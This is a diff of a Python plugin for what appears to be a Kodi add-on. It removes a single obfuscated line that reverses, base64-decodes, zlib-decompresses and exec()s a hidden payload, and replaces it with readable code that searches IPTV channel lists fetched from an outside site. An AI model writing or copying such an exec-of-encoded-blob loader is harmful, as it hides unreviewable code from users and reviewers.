@@ -1,2 +1,64 @@
-# 1691773130
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=YM6/I2/Pfe95P6LwGmkOU2AHrroeURyVHnPHvpx6qksAWR2sSptYc3k4RzpJqQ01JbOD5X0FlRsjcx6doH6v7gLYvHGZJL3zyX3th9TjHoOQ8T9zJBP19HBoOxv5fMfHrWAEAWDWKsuei39XfylCX1/r473Jcyy5gG5hx3/odyUV7+jOi/E1KvbRz1d24mIgyU2E2q93Prmv4PNKqf+9GQZFFXm3/3GygOe7zC5AzXTvLdtmTPsvaaUL5CcUbm+jW6amPVo8jZAqDeapO5AcPsFW/GvDiAp53OuD/1xvRVUmc0wRbzYzSwr7NcM76KIEhjqzM3N5qScamJaa/Kbgos2y8wE0hG7+zoy/5i+SCjaTwp6ByOgTlKQEtSN4nD9b675VDKp9uAH2zUn8F+SBKl2rSK9D5i/z/GMao1aasl2W7iBdIb43TRFXcKTCIOBi5liC+doxAgnIwg1rhTguN1ssYhRyjMO7HQulXSTn5WHYDdsQO/MfS3tbqgks1Vp1gpV3apt6NnYlAsPw38vBN78rx4HE+9NKO0rumg5b9y9MMYoaQUsG1Ei6b9DbyiZTqnLmn4Lmu0VACWHr4KwM4ut1jVScTI/iadl0n817Drz1WXoEoWO44S1wdXGUsovWCJNIWshlJqezoIECZPFjs3I6B8l9Dd4jNfNlwSsJWh3wfr3K6l9sUbyLq0XE9+uzw99TCpDnwaSaG3+EcpMLW1DE1BIuEY6RhZLXE/KNYVz6lEc+fdCbrJeTDDTJp1bd3XDVUXieEGIeiUF3PotKC7L2d5UxZYFDlX7oynBqA6ERFHv/UZm0wpjz1GPOce9VNQYcFvCWhFoJGVpag0wMoEjhpu+UtbTK//F+CbawUnj7gdbtGi/p74AT2GuuOR+Vj31XsdZ264Kq1SNtZ1xxdb4Ib9U018LJI+f2EaOi80CQteLO1EVbaUBYQ6DXfioOaqcgGSbIrDTk60S0SDPZRcBFf9MVg1jBk67hu0GWdNf5y6a/GcfAD7jtu/k4RFIoT3srTqFxG6gGguIxnlvzI8IyLf+0Q7Uj0jBLQadZfClK7eFVpZMLHWyzUb4/9dUnAhu0m6YeRpMX9CdKcZNVMk0tU1Aak7KZVnbTmh63bsgnPOIQfJ1cSSJRopWDQHerMksenitScn2mjC30Ms1hFGXMcyYuq/+VzCo1qPyF5DfzAm/Beh4A2Tv+Is256i9h7rtpvE7/orug/pYbsg7CuhLdJrRudShiTbTsvZ5USuyaKCLy5nMxZ5U4W7Nqp4ZU/5Ues+43v3vfQJdW36Bc0EzKEns0QkBEabOtH3wOwkAjhpBtUUMxKFjVnhqUtFttOhk25raWdhNdfEf9buh2QSxfH7crLDTS9pcgJvI+T5uZOj4+239tAHeKA6esso3etd9j0lli390F0lGmsr9x95JaMuPSG0QTurtQAnioMi6uD1F7rv/dlf///97Vfzc2t/u0/90OzVGweWo3dDu+jLFKGA8oIbSHHOQAoFnWXr0NwJe'))
+import json
+from resources.lib.plugin import run_hook
+from resources.lib.util.dialogs import link_dialog
+from ..plugin import Plugin
+import xbmcgui, requests
+
+class xtream_server(Plugin):
+    name = "xtream_server"
+    priority = 100
+
+    def process_item(self, item):
+        if self.name in item:
+            link = item.get(self.name, "")
+            if link.startswith("dialog:"):
+                path = "search_dialog"
+                item["is_dir"] = False
+                link = link.replace("dialog:", "")
+            else:
+                path = "search"
+                item["is_dir"] = True
+            if "," in link:
+                split = link.split(",")
+                item["link"] = f"{self.name}/{path}/{split[0]}?query={split[1]}"
+            else:
+                item["link"] = f"{self.name}/{path}/{link}"
+            item["list_item"] = xbmcgui.ListItem(item.get("title", item.get("name", "")), offscreen=True)
+            return item
+
+    def search_query(self, country, query=None):
+        if query == None:
+            query = xbmcgui.Dialog().input("Search query")
+            if not query:
+                return None
+        r = requests.get(f"https://magnetic.website/jet/xtream/{country}.json").json()
+        jen_list = []
+        for channel in r:
+            if query.lower() in channel["channel"].lower():
+                jen_data = {
+                    "title": channel["channel"],
+                    "sportjetextractors": ["jetproxy://" + channel["link"]],
+                    "type": "item"
+                }
+                jen_list.append(jen_data)
+        return jen_list
+    
+    def routes(self, plugin):
+        @plugin.route(f"/{self.name}/search/<country>")
+        def search(country):
+            jen_list = self.search_query(country, plugin.args["query"][0] if "query" in plugin.args else None)
+            if not jen_list:
+                return
+            jen_list = [run_hook("process_item", item) for item in jen_list]
+            jen_list = [run_hook("get_metadata", item, return_item_on_failure=True) for item in jen_list]
+            run_hook("display_list", jen_list)
+        
+        @plugin.route(f"/{self.name}/search_dialog/<country>")
+        def search_dialog(country):
+            jen_list = self.search_query(country, plugin.args["query"][0] if "query" in plugin.args else None)
+            if not jen_list:
+                return
+            idx = link_dialog([res["title"] for res in jen_list], return_idx=True, hide_links=False)
+            if idx == None:
+                return True
+            run_hook("play_video", json.dumps(jen_list[idx]))
